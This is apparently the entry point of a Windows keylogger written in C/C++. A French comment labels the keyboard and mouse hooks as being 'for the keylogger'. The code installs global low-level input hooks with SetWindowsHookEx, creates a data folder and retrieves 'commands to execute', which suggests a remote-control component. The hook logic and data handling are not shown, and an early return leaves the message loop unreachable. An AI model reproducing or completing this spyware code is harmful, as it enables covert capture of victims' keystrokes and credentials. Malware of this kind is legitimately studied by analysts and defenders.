#include "pa5a.hpp"


EXTERN_C_START


/********************************************************************************************************************************************************/
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) 
{
    MSG     msg;
    DWORD   ret;

#ifdef DEBUG
    AllocConsole();
    FILE* file = NULL;

    freopen_s(&file, "CONIN$", "r", stdin);
    freopen_s(&file, "CONOUT$", "w", stdout);
    freopen_s(&file, "CONOUT$", "w", stderr);
#endif // DEBUG

    CreateDirectoryW(DATA_FOLDER, NULL);

    //Hooks clavier et souris pour le keylogger
    SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0);
    SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0);

 
    struct CommandsToExecute c;

    GetCommands(&c);
    system("pause");
    return 0;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
/********************************************************************************************************************************************************/

EXTERN_C_END

